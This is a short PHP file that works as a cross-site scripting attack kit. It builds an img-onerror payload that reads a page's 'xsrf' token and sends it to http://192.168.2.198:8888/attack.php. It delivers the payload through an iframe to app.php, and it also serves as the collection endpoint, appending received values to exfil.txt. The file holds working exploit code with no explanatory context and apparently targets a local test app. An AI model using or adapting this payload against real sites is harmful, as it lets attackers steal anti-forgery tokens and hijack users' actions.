<?php

if (isset($_GET['x'])) {
  $f = fopen('exfil.txt', 'a');
  fwrite($f, $_GET['x'] . "\n");
  fclose($f);
  die('');
}

$payload = '<img src=asdf.png onerror="document.createElement(\'IMG\').src=\'http://192.168.2.198:8888/attack.php?x=\'+document.getElementById(\'xsrf\').value" />';
$payload = urlencode($payload);

?>

<iframe src="http://127.0.0.1:8888/app.php?msg=<?=$payload ?>"></iframe>




